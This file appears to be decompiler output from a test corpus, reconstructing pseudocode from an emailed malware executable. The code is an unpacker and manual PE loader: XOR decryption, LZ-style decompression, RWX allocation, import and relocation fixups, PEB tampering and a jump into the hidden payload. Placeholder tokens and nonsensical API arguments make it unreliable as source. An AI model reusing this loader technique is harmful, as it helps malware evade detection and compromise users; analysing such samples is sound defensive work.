// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0731/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401030(Eq_28 dwArg04, Eq_28 dwArg08, Eq_28 dwArg0C)
{
	globals->dw4062F0 = 0x00000000;
	while (globals->dw4062F0 <u dwArg0C)
	{
		dwArg04[globals->dw4062F0] = dwArg08[globals->dw4062F0];
		globals->dw4062F0 = globals->dw4062F0 + 0x00000001;
	}
	return;
}

void fn004010C0(word32 ebx, word32 esi, word32 edi, Eq_200 * fs, word32 dwArg04)
{
	code * eax_30 = GetProcAddress(LoadLibraryA(0x00406204), 0x004061EC);
	eax_30();
	lstrcatA(fp - 0x00000074, 0x00406214);
	if (CreateFileA(fp - 0x00000074, 0x00000001, 0x00000000, 0x00000000, 0x00000003, 0x00000080, 0x00000000) == 0xFFFFFFFF)
	{
l00401312:
		return;
	}
	else
	{
		fp->dwFFFFFF50 = 0x00000064;
		fp->dwFFFFFF50 = fp - 0x00000074;
		eax_30();
		fp->dwFFFFFF50 = 0x00406224;
		fp->dwFFFFFF50 = fp - 0x00000074;
		lstrcatA(0x00000000, 0x00000003);
		fp->dwFFFFFF50 = 0x00000000;
		fp->dwFFFFFF50 = 0x00000080;
		fp->dwFFFFFF50 = 0x00000003;
		fp->dwFFFFFF50 = 0x00000000;
		if (CreateFileA(fp - 0x00000074, 0x00000001, 0x00000000, 0x00000001, 0x00000000, 0x00000000, 0x00000003) != 0xFFFFFFFF)
			goto l00401312;
		else
		{
			fp->dwFFFFFF50 = 0x00000000;
			Eq_28 eax_161 = GetModuleHandleA(null);
			if ((dwArg04 & 0x0000FFFF) != 0x00000000)
				globals->dw406308 = 0x00000000;
			else
				globals->dw406308 = 0x00000001;
			if (dwArg04 == 0x00000000)
			{
				globals->dw406308 = 0x00000001;
				globals->dw406308 = globals->dw406308 - 0x00000001;
			}
			if (globals->dw406308 != 0x00000000)
				globals->t4062F8 = dwArg04;
			Eq_28 eax_182 = globals->t402001;
			Eq_28 edx_185 = globals->t402005;
			Eq_28 dwLoc08_187 = 0x00000000;
			while (dwLoc08_187 <u eax_182)
			{
				Mem201[dwLoc08_187 + 0x00402001 + 0x00000008:word32] = Mem160[dwLoc08_187 + 0x00402001 + 0x00000008:word32] ^ 0x00AA2C27;
				dwLoc08_187 = dwLoc08_187 + 0x00000008;
			}
			Mem208[fp - 0x000000B8:word32] = edx_185;
			globals->dw406304 = fn00401950(0x00000003);
			Mem214[fp - 0x000000B8:word32] = eax_182;
			fp->dwFFFFFF50 = globals->dw406304;
			fp->dwFFFFFF50 = 0x00402009;
			fn00401B20(0x00000000, 0x00000000, 0x00000003);
			globals->dw4062F4 = edi;
			globals->dw4062EC = esi;
			globals->dw406300 = ebx;
			globals->ptr40630C = fs->ptr0018;
			globals->dw4062FC = fp - 0x00000004;
			if (globals->dw406308 != 0x00000000)
				fn00401980(0x004012E3 - dwArg04, dwArg04);
			else
				fn00401980(0x004012E3 - eax_161, eax_161);
			word32 ecx_235 = globals->dw406304;
			fn00401340(fp - 0x00000004, ecx_235);
			Mem231[0x00406310:word32]();
			return;
		}
	}
}

word32 fn00401320(Eq_28 dwArg04, word32 dwArg08)
{
	return GetProcAddress(dwArg04, dwArg08);
}

void fn00401340(word32 ebp, word32 dwArg04)
{
	lstrcpyA(&fp->dwFFFFFF38, 0x00406234);
	word32 eax_23 = dwArg04 + Mem0[dwArg04 + 0x0000003C:word32];
	Eq_269 * dwLoc2C_167 = &eax_23->w0014 + (word32) eax_23->w0014;
	Eq_28 eax_40 = VirtualAlloc(0x00000000, eax_23->t0050, 0x00003000, 0x00000040);
	if (eax_40 == 0x00000000)
		;
	else
	{
		Mem130[fp - 0x000000C8:word32] = Mem0[dwArg04 + 0x0000003C:word32] + 0x00000138 + (word32) Mem0[eax_23 + 0x00000006:word16] *s 0x00000028;
		Mem133[fp - 0x000000CC:word32] = dwArg04;
		fn00401030(eax_40, 0x00003000, 0x00000040);
		fp->dwFFFFFFE4 = 0x00406248;
		fp->dwFFFFFFE4 = 0x00406258;
		Mem146[fp - 0x000000CC:word32] = GetModuleHandleA(0x00003000);
		code * eax_147 = GetProcAddress((Eq_1177 *) 0x00003000, 0x00000040);
		fp->dwFFFFFFE4 = 0x00406268;
		fp->dwFFFFFFE4 = 0x0040627C;
		Mem157[fp - 0x000000CC:word32] = GetModuleHandleA((Eq_1177 *) 0x00003000);
		code * eax_158 = GetProcAddress((Eq_1177 *) 0x00003000, 0x00000040);
		up32 dwLoc10_161 = 0x00000000;
		while (dwLoc10_161 <u (word32) eax_23->w0006)
		{
			if (dwLoc2C_167->dw0014 != 0x00000000 && dwLoc2C_167->dw0010 != 0x00000000)
			{
				word32 eax_201 = dwLoc2C_167->dw0010 - 0x00000001 + eax_23->t003C;
				fn00401030(eax_40 + Mem157[dwLoc2C_167 + 0x0000000C:word32], dwArg04 + Mem157[dwLoc2C_167 + 0x00000014:word32], SEQ(SEQ(0x00000000, eax_201) % eax_23->t003C, eax_201) /u eax_23->t003C *s eax_23->t003C);
			}
			dwLoc2C_167 = dwLoc2C_167 + 1;
			dwLoc10_161 = dwLoc10_161 + 0x00000001;
		}
		word32 ecx_229 = eax_40 + Mem157[eax_40 + 0x0000003C:word32];
		word32 eax_235 = Mem157[ecx_229 + 0x00000050:word32];
		fp->dwFFFFFFE4 = 0x00000004;
		eax_158();
		if (eax_235 == 0x00000000)
			;
		else
		{
			code * eax_261 = fn00401320(GetModuleHandleA(0x00406298), 0x0040628C);
			word32 dwLocC0_268 = eax_40 + Mem241[ecx_229 + 0x00000080:word32];
			while (dwLocC0_268->dw0010 != 0x00000000)
			{
				Eq_441 * dwLoc38_296;
				Eq_442 * dwLoc28_295;
				Eq_28 eax_289 = LoadLibraryA(eax_40 + Mem241[dwLocC0_268 + 0x0000000C:word32]);
				if (dwLocC0_268->dw0000 != 0x00000000)
				{
					dwLoc28_295 = eax_40 + Mem241[dwLocC0_268 + 0x00000000:word32];
					dwLoc38_296 = eax_40 + Mem241[dwLocC0_268 + 0x00000010:word32];
				}
				else
				{
					dwLoc28_295 = eax_40 + Mem241[dwLocC0_268 + 0x00000010:word32];
					dwLoc38_296 = eax_40 + Mem241[dwLocC0_268 + 0x00000000:word32];
				}
				if (dwLocC0_268->dw0010 != 0x00000000 && dwLocC0_268->dw0000 != 0x00000000)
				{
					fp->dwFFFFFFE4 = 0x00000001;
					goto l00401580;
				}
l00401580:
				while (dwLoc28_295->ptr0000 != null)
				{
					if ((dwLoc28_295->ptr0000 & 0x80000000) != 0x00000000)
						dwLoc28_295->ptr0000 = fn00401320(eax_289, dwLoc28_295->ptr0000 & 0x7FFFFFFF);
					else
						Mem376[dwLoc28_295 + 0x00000000:word32] = fn00401320(eax_289, Mem241[dwLoc28_295 + 0x00000000:word32] + 0x00000002 + eax_40);
					if (dwLoc28_295->ptr0000 == null)
						goto l004018D8;
					if (0x00000000 != 0x00000000)
						dwLoc38_296->ptr0000 = dwLoc28_295->ptr0000;
					dwLoc28_295 = dwLoc28_295 + 1;
					dwLoc38_296 = dwLoc38_296 + 1;
				}
				dwLocC0_268 = dwLocC0_268 + 1;
			}
			if (globals->dw406308 != 0x00000000)
			{
				word32 edx_680 = Mem241[0x004062F8:word32] - Mem241[ecx_229 + 0x00000034:word32];
				if (Mem241[ecx_229 + 0x000000A4:word32] != 0x00000000)
				{
					word32 dwLoc24_689 = eax_40 + Mem241[ecx_229 + 0x000000A0:word32];
					while (dwLoc24_689->dw0004 != 0x00000000)
					{
						uint32 edx_704 = dwLoc24_689->dw0004 - 0x00000008 >>u 0x00000001;
						word16 * eax_707[] = &dwLoc24_689->a0008[0];
						uint32 dwLoc10_710 = 0x00000000;
						while (dwLoc10_710 <u edx_704)
						{
							if ((word32) eax_707[dwLoc10_710] >> 0x0000000C == 0x00000003)
								(eax_40 + Mem241[dwLoc24_689 + 0x00000000:word32])[(word32) eax_707[dwLoc10_710] & 0x00000FFF] = (eax_40 + Mem241[dwLoc24_689 + 0x00000000:word32])[(word32) eax_707[dwLoc10_710] & 0x00000FFF] + edx_680;
							dwLoc10_710 = dwLoc10_710 + 0x00000001;
						}
						dwLoc24_689 = dwLoc24_689 + Mem241[dwLoc24_689 + 0x00000004:word32];
					}
				}
			}
			Eq_28 eax_435;
			word32 esp_440;
			code * eax_422 = GetProcAddress(GetModuleHandleA(0x004062B8), 0x004062A8);
			if (globals->dw406308 != 0x00000000)
			{
				Eq_28 edx_645 = globals->t4062F8;
				Mem647[fp - 0x000000E0:word32] = edx_645;
				eax_435 = eax_235;
				esp_440 = fp - 0x000000F4;
				eax_422();
				globals->t4062E8 = eax_235;
			}
			else
			{
				word32 edx_662 = Mem241[ecx_229 + 0x00000034:word32];
				Mem664[fp - 0x000000E0:word32] = edx_662;
				eax_435 = eax_235;
				esp_440 = fp - 0x000000F4;
				eax_422();
				globals->t4062E8 = eax_235;
			}
			if (globals->t4062E8 == 0x00000000)
			{
				word32 esp_513;
				if (globals->dw406308 != 0x00000000)
				{
					esp_513 = fp - 0x000000F8;
					eax_147();
					if (eax_435 == 0x00000000)
					{
						esp_513 = fp - 0x00000104;
						eax_261();
						if (eax_435 == 0x00000000)
							;
						else
						{
l0040179C:
l004017C8:
							if (globals->dw406308 != 0x00000000)
							{
								Eq_28 ecx_557 = globals->t4062F8;
								Eq_797 * esp_558 = esp_513 - 0x00000004;
								esp_558->t0000 = ecx_557;
								Mem561[esp_558 - 0x00000004:word32] = 0x00000000;
								Mem563[esp_558 - 0x00000008:word32] = 0x00000000;
								Mem565[esp_558 - 0x0000000C:word32] = 0x00000000;
								Mem567[esp_558 - 0x00000010:word32] = 0x00000022;
								esp_558->t0000 = eax_235;
								esp_440 = esp_558 - 0x00000014;
								eax_422();
								globals->t4062E8 = eax_435;
							}
							else
							{
								word32 ecx_573 = Mem241[ecx_229 + 0x00000034:word32];
								Eq_766 * esp_574 = esp_513 - 0x00000004;
								esp_574->t0000 = ecx_573;
								Mem577[esp_574 - 0x00000004:word32] = 0x00000000;
								Mem579[esp_574 - 0x00000008:word32] = 0x00000000;
								Mem581[esp_574 - 0x0000000C:word32] = 0x00000000;
								Mem583[esp_574 - 0x00000010:word32] = 0x00000022;
								esp_574->t0000 = eax_235;
								esp_440 = esp_574 - 0x00000014;
								eax_422();
								globals->t4062E8 = ecx_229;
							}
							if (globals->t4062E8 == 0x00000000)
								if (globals->dw406308 == 0x00000000)
								{
									Eq_872 * esp_528 = esp_440 - 0x00000004;
									esp_528->t0000.u0 = 0x00000040;
									esp_528->t0000.u0 = 0x00003000;
									Mem535[esp_528 - 0x00000008:word32] = Mem531[ecx_229 + 0x00000050:word32];
									Mem539[esp_528 - 0x0000000C:word32] = Mem535[ecx_229 + 0x00000034:word32];
									globals->t4062E8 = VirtualAlloc(esp_528->t0000, esp_528->t0000, esp_528->t0000, esp_528->t0000);
									esp_440 = &esp_528->t0000;
								}
								else
								{
									Eq_833 * esp_543 = esp_440 - 0x00000004;
									esp_543->t0000.u0 = 0x00000040;
									esp_543->t0000.u0 = 0x00003000;
									Mem550[esp_543 - 0x00000008:word32] = Mem546[ecx_229 + 0x00000050:word32];
									Mem553[esp_543 - 0x0000000C:word32] = Mem550[0x004062F8:word32];
									globals->t4062E8 = VirtualAlloc(esp_543->t0000, esp_543->t0000, esp_543->t0000, esp_543->t0000);
									esp_440 = &esp_543->t0000;
								}
l0040185C:
							Eq_658 * esp_454 = esp_440 - 0x00000004;
							esp_454->t0000 = eax_235;
							CloseHandle(esp_454->t0000);
							Mem461[esp_454 + 0x00000000:word32] = Mem455[ecx_229 + 0x00000050:word32];
							esp_454->t0000 = eax_40;
							esp_454->t0000 = globals->t4062E8;
							fn00401030(dwArg00, dwArg04, dwArg08);
							if (globals->dw406308 != 0x00000000)
							{
								Mem488[esp_454 + 0x00000000:word32] = Mem467[0x004062E8:word32] + Mem467[ecx_229 + 0x00000028:word32];
								esp_454->t0000 = globals->t4062F8;
								fn004018E0(dwArg00, dwArg04);
							}
							else
							{
								esp_454->t0000 = globals->t4062E8;
								fn00401AF0(dwArg00);
							}
							Mem478[0x00406310:word32] = Mem467[0x004062E8:word32] + Mem467[ecx_229 + 0x00000028:word32];
							Mem481[ecx_229 + 0x00000028:word32] = Mem478[0x00406310:word32];
						}
					}
					else
						goto l0040179C;
				}
				else
				{
					eax_435 = ecx_229;
					esp_513 = fp - 0x000000F8;
					eax_147();
					if (ecx_229 == 0x00000000)
					{
						eax_435 = Mem241[ecx_229 + 0x00000034:word32];
						esp_513 = fp - 0x00000104;
						eax_261();
						if (eax_435 == 0x00000000)
							;
						else
							goto l004017C8;
					}
					else
						goto l004017C8;
				}
			}
			else
				goto l0040185C;
		}
	}
l004018D8:
	return;
}

void fn004018E0(Eq_28 dwArg04, Eq_28 dwArg08)
{
	Eq_912 * ecx_14 = globals->ptr40630C->ptr0030->ptr000C->ptr000C;
	Eq_912 * dwLoc0C_15 = ecx_14;
	while (0x00000001 != 0x00000000)
	{
		if (dwLoc0C_15 == null)
			goto l0040194C;
		if (dwLoc0C_15->dw0018 == dwArg04)
		{
			dwLoc0C_15->dw001C = dwArg08;
			goto l0040194C;
		}
		Eq_912 * eax_53 = dwLoc0C_15->ptr0000;
		dwLoc0C_15 = eax_53;
		if (eax_53 == ecx_14)
			goto l0040194C;
	}
l0040194C:
	return;
}

word32 fn00401950(word32 dwArg04)
{
	return VirtualAlloc(0x00000000, dwArg04, 0x00003000, 0x00000004);
}

void fn00401980(word32 dwArg04, Eq_28 dwArg08)
{
fn00401980_entry:
l00401980:
	Eq_28 dwLoc28_13
	branch globals->dw406308 == 0x00000000 l0040199A
l00401990:
	dwLoc28_13 = globals->t4062F8;
	goto l004019A0
l0040199A:
	dwLoc28_13 = dwArg08;
l004019A0:
	word32 ecx_18 = dwLoc28_13 + Mem0[dwLoc28_13 + 0x0000003C:word32]
	code * eax_29 = GetProcAddress(GetModuleHandleA(0x004062D8), 0x004062C8)
	Eq_28 eax_37 = ecx_18->t0050
	eax_29()
	globals->t4062E8 = eax_37;
	branch globals->t4062E8 != 0x00000000 l004019F7
l004019ED:
	goto l00401AE9
l004019F7:
	fn00401030(globals->t4062E8, dwLoc28_13, ecx_18->t0050)
	word32 edx_65 = globals->t4062E8 - dwLoc28_13
	branch ecx_18->dw00A4 == 0x00000000 l00401ADE
l00401A2D:
	Eq_997 * dwLoc0C_158 = dwLoc28_13 + Mem45[ecx_18 + 0x000000A0:word32]
l00401A3C:
	branch dwLoc0C_158->dw0004 == 0x00000000 l00401ADE
l00401A49:
	uint32 edx_106 = dwLoc0C_158->dw0004 - 0x00000008 >>u 0x00000001
	word16 * eax_109[] = &dwLoc0C_158->a0008[0]
	uint32 dwLoc08_112 = 0x00000000
	goto l00401A72
l00401A69:
	dwLoc08_112 = dwLoc08_112 + 0x00000001;
l00401A72:
	branch dwLoc08_112 >=u edx_106 l00401ACD
l00401A7A:
	branch (word32) eax_109[dwLoc08_112] >> 0x0000000C != 0x00000003 l00401ACB
l00401A8C:
	(Mem45[0x004062E8:word32] + Mem45[dwLoc0C_158 + 0x00000000:word32])[(word32) eax_109[dwLoc08_112] & 0x00000FFF] = (Mem45[0x004062E8:word32] + Mem45[dwLoc0C_158 + 0x00000000:word32])[(word32) eax_109[dwLoc08_112] & 0x00000FFF] + edx_65;
l00401ACB:
	goto l00401A69
l00401ACD:
	dwLoc0C_158 = dwLoc0C_158 + Mem45[dwLoc0C_158 + 0x00000004:word32];
	goto l00401A3C
l00401ADE:
l00401AE9:
	return
fn00401980_exit:
}

void fn00401AF0(Eq_28 dwArg04)
{
	Eq_202 * edx_7 = globals->ptr40630C;
	edx_7->ptr0030->dw0008 = dwArg04;
	return;
}

void fn00401B20(word32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	up32 dwLoc0C_112 = 0x00000001;
	byte cl_12 = *dwArg04;
	word32 dwLoc18_118 = 0x00000000;
	do
	{
		up32 ecx_34 = dwLoc0C_112 + 0x00000001;
		byte al_31 = dwArg04[dwLoc0C_112];
		dwLoc0C_112 = ecx_34;
		if ((word32) al_31 != (word32) cl_12)
		{
			dwArg08[dwLoc18_118] = al_31;
			dwLoc18_118 = dwLoc18_118 + 0x00000001;
		}
		else if ((word32) dwArg04[ecx_34] == 0x00000000)
		{
			dwArg08[dwLoc18_118] = cl_12;
			dwLoc18_118 = dwLoc18_118 + 0x00000001;
			dwLoc0C_112 = ecx_34 + 0x00000001;
		}
		else
		{
			word32 eax_98 = fn00401C20(fp - 0x00000010, dwArg04 + ecx_34) + ecx_34;
			dwLoc0C_112 = fn00401C20(fp - 0x00000020, dwArg04 + eax_98) + eax_98;
			up32 dwLoc1C_113 = 0x00000000;
			while (dwLoc1C_113 <u dwLoc10)
			{
				dwArg08[dwLoc18_118] = dwArg08[dwLoc18_118 - dwLoc20];
				dwLoc18_118 = dwLoc18_118 + 0x00000001;
				dwLoc1C_113 = dwLoc1C_113 + 0x00000001;
			}
		}
	} while (dwLoc0C_112 <u dwArg0C);
	return;
}

word32 fn00401C20(word32 dwArg04, word32 dwArg08)
{
	word32 dwLoc08_12 = 0x00000000;
	word32 dwLoc10_13 = 0x00000000;
	do
	{
		word32 ecx_16 = (word32) dwArg08->b0000;
		word32 ecx_26 = ecx_16 & 0x0000007F | dwLoc08_12 << 0x00000007;
		word32 edx_29 = dwLoc10_13 + 0x00000001;
		dwArg08 = dwArg08 + 1;
		dwLoc08_12 = ecx_26;
		dwLoc10_13 = edx_29;
	} while ((ecx_16 & 0x00000080) != 0x00000000);
	*dwArg04 = ecx_26;
	return edx_29;
}

